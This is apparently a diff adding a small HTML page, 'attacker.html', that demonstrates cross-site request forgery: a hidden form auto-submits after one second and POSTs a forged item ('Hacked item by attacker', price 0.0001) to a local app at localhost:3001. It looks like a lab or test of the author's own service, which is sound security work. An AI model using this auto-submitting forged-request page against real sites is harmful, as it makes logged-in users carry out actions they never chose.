@@ -1,0 +1,15 @@
+<!-- public/attacker.html -->
+<!doctype html>
+<html>
+  <body>
+    <h3>Attacker page — sẽ auto-submit form</h3>
+    <form id="f" action="http://localhost:3001/items" method="POST">
+      <input type="hidden" name="name" value="Hacked item by attacker" />
+      <input type="hidden" name="startingPrice" value="0.0001" />
+    </form>
+    <script>
+      // auto submit
+      setTimeout(() => document.getElementById('f').submit(), 1000)
+    </script>
+  </body>
+</html>
